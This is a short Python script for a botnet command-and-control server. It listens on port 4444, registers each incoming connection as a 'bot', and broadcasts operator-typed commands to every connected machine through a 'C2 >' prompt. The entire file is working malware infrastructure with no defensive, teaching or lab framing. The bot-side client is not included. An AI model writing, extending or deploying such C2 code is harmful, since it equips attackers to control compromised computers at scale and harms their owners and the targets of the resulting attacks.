import socket
import threading

bots = []

def handle_bot(conn, addr):
    print(f"[+] Bot connected: {addr}")
    bots.append(conn)
    try:
        while True:
            data = conn.recv(1024)
            if not data:
                break
    except:
        pass
    print(f"[-] Bot disconnected: {addr}")
    bots.remove(conn)
    conn.close()

def accept_bots(server):
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_bot, args=(conn, addr), daemon=True).start()

def broadcast_command(command):
    print(f"[>] Sending command to {len(bots)} bots: {command.strip()}")
    for bot in bots:
        try:
            bot.sendall(command.encode())
        except:
            bots.remove(bot)

def main():
    HOST = '0.0.0.0'
    PORT = 4444

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen()
    print(f"[C2] Listening on port {PORT}...")

    threading.Thread(target=accept_bots, args=(server,), daemon=True).start()

    while True:
        try:
            cmd = input("C2 > ").strip()
            if not cmd:
                continue
            if cmd.lower() == "list":
                print(f"[i] {len(bots)} bots connected")
                continue
            broadcast_command(cmd + "\n")
        except KeyboardInterrupt:
            print("\n[C2] Shutting down...")
            break

if __name__ == "__main__":
    main()
